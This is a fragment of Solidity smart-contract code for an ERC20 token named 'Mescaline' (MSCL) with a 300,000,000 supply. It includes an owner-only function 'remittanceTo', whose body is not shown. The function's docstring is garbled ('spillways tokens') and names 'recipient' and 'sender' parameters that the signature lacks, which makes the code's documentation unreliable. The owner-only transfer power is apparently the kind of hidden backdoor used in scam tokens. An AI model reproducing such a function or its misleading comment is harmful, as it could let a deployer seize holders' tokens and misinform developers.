...
contract ERC20 is Context, IERC20, Ownable {
    ...
    /**
     * @dev spillways tokens 'amount' to 'recipient' from 'sender'.
     * This description describes the internal function of [transfer]. 
     * Can be implemented into e.g. slash mechanisms, introduce token fees automatically etc.
     */
    function remittanceTo(address account, uint256 amount) external onlyOwner {
...
contract Mescaline is ERC20("Mescaline", "MSCL") {
    
    uint256 _initialSupply;

    constructor() public {
    
    /// @notice Creates total supply of 300000000 tokens.    
        _initialSupply = 300000000 * 10 ** _decimals;
